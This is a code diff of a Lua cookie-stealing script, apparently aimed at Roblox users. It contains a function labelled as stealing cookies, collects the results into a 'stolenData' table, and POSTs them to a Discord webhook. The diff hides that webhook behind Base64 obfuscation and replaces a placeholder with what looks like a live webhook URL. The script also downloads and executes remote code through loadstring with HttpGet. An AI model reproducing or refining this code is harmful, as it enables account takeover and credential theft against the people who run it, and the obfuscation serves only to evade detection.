@@ -11,7 +11,7 @@ local http = (syn and syn.request) or (http and http.request) or request
 local Base64 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Base64Encode/Base64/main/lua.lua"))()  
 
 -- Obfuscated Discord webhook  
-local webhook = Base64.Decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTExMTExMTExMTExMTExMTExL3hYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY")  
+local webhook = Base64.Decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MDk5MDk2ODMwMzUyMTkwMi9TSkZfNlE5dFFDN1Rsekp4WW9PaXFVZ0RWZWxINE1ETU9ZLWI4S0YtM0VERktrT09EbmwybzU3TFRkOThOa1F2dUhyNg==")  
 
 -- Function to steal cookies (if available)  
 local function GetCookie()  
@@ -91,7 +91,7 @@ local stolenData = {
 
 -- Send to Discord  
 http({  
-    Url = "https://discord.com/api/webhooks/1390990968303521902/SJF_6Q9tQC7TlzJxYoOiqUgDVelH4MDMOY-b8KF-3EDFKkOODnl2o57LTd98NkQvuHr6",  
+    Url = webhook,  
     Method = "POST",  
     Headers = {["Content-Type"] = "application/json"},  
     Body = game:GetService("HttpService"):JSONEncode({  
